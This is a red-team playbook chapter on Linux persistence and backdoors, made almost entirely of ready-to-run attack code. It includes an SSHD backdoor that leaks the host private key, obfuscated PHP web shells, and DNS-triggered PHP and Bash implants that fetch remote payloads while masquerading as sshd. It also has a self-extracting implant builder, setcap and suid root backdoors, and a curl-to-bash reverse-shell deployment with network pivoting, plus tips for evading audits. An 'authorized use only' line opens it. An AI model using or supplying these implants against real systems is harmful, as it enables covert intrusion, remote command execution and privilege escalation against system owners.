# 04 — Persistence & Backdoors

> Authorized use only. Persistence = highest-impact technique; document every implant in the
> brain so it can be removed at engagement end.

---

## §sshd-backdoor — SSHD backdoor (survives apt update, no new file)

Adds one line to SSHD config so the **host key** also works as an authorized key. No
`authorized_keys`, no PAM, no new files.

```bash
backdoor_sshd() {
	local B="/etc/ssh"
	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
	local N=$(cd "${D}" || exit; shopt -s nullglob; echo *.conf)
	[ -n "$N" ] && N="${N%%\.conf*}.conf"
	N="${D}/${N:-50-cloud-init.conf}"
	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking"
	echo -e "Your id_ed25519 to log in as any user:\n$(cat "${K}")"
	grep -qm1 '^AuthorizedKeysFile' "$N" && { echo >&2 "WARN: Already backdoored"; return; }
	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
	touch -r "$K" "$N" "$D"
	systemctl restart ssh
}
backdoor_sshd
```

**How it works:** SSHD checks `~/.ssh/authorized_keys` *and* `/etc/ssh/ssh_host_ed25519_key.pub`.
You hold the host's private key → log in as any user. **Loot the private key it prints.**

---

## §php-backdoor — Smallest PHP backdoor

Add to the top of any PHP file:
```php
<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
```
Decoded: `if(isset($_POST[0])){system($_POST[0]);die;}`

**Test:**
```bash
cd /var/www/html && php -S 127.0.0.1:8080   # optional test server
curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
```

**Obfuscated variant with eval() backup** (hides in base64-comments, runs command OR PHP code):
```php
<?PHP /*1rUY9TDs2wG8In1HkSQzqViVtX2nGidgu/RkzKNJbfho9NqtfTaww4GcR6bIGU+U1AJq
USOIjliQm4T/9HP6YS6IMhwoZzmr2iydbwDcVynDqtLjI5i7owLKmjbKnijTszoXP/dif9ZcbhtJ
WQKmhCno0boYQQ2rjHgW3su1C7pYREPSdrYD/4QBpptJU7Djnm5zuyD2TXNjHXm/ZYUW+n4s3PM7
aWqzWzy*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*P
0KKBW1rvtqxOK8L9Ok6y7Rulkl2um62KVxvVx/+kODDw4HZV5Yx/HK/7lG+X/IkK8LViCIuaedXl
HM1wHBlDluhe8BN6pH33fn0bfFpjCDaKrKwK3QF6ExJu1JgKK9deyWUTcqbr0dhe7ZliOIldh3of
+4qUjhVdK4SoeND/Dd+iwRAbhZKxaHfng4ADqdWrwjUPoyTjzOp6C3iDzunviiG0RC3iDuCY*/?>
```
```bash
curl http://127.0.0.1:8080/x.php -d0='id'                                        # command
curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'  # PHP code
```

---

## §dns-implant — DNS-triggered implant (target not internet-reachable)

Execute commands on a server unreachable from the internet via a reverse DNS trigger.

**PHP implant:**
```php
<?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
```
Payload (set as your domain's TXT record):
```bash
echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' | base64 -w0
```
Limits: TXT ≤ 2048 chars (sometimes 65535). Use a while-loop bootloader for larger payloads.

**Bash implant (add to ~/.bashrc or cron):**
```bash
bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"' &>/dev/null
```

**Bash daemon generator** (polls hourly, hides as sshd, bash+dig+base64 only):
```bash
base64 -w0 >x.txt <<-'EOF'
D=b00m2.team-teso.net
P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
M=/dev/shm/.cache${UID}
[ -f $M ]&&exit
touch $M
(echo 'slp(){ local IFS;[ -n "${_sfd:-}" ]||exec {_sfd}<> <(:);read -t$1 -u$_sfd||:;}
slp 1
while :; do
	dig +short '"$D"' TXT|tr -d \ \"|base64 -d|bash
	slp 3600
done'|exec -a "$P" bash &) &>/dev/null
EOF
echo "Add to target's ~/.bashrc or cron:  echo $(<x.txt)|base64 -d|bash"
rm -f x.txt
```

**Perl variant** (no dig needed) and **Python variant** — see source `hack tricks/backdoor tricks`.
Use your **own domain** (Cloudflare free tier) and your **own payload**.

---

## §mkegg — Self-extracting implant

Bundle files + a run-command into a single self-extracting shell script.

```bash
# create egg.sh containing 'foo' and dir 'warez', running 'warez/run.sh' on exec:
./mkegg.sh egg.sh foo warez warez/run.sh

# real-world: install gsocket + call webhook on success:
./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=<key> deploy-all.sh 2>/dev/null >/dev/null &)'
# on target: 'cat egg.sh | bash' or './egg.sh'
```

---

## §local-root — Local root backdoors

**1. setcap on the dynamic loader (as root):**
```bash
fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
setcap cap_setuid,cap_setgid+ep "${fn}"
```
**Trigger as non-root → root:**
```bash
fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
"${fn:?}" "$p" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'
```

**2. Good old b00m shell (suid sh):**
```bash
{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
```

**OPSEC:** suid binaries are found by `find / -xdev -type f -perm /6000`. Prefer setcap-loader
(less commonly audited) and remove at engagement end.

---

## §gsocket-deploy — Full-featured encrypted reverse shell

```bash
bash -c "$(curl -fsSLk https://gsocket.io/y)"
# or: bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
# own deployment server: LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"
```

**Network-wide access (SOCKS exit node on target LAN):**
```bash
gs-netcat -l -S        # compromised host
gs-netcat -p 1080      # your workstation
socat - "SOCKS4a:127.1:route.local:22"   # reach any host on target LAN
```
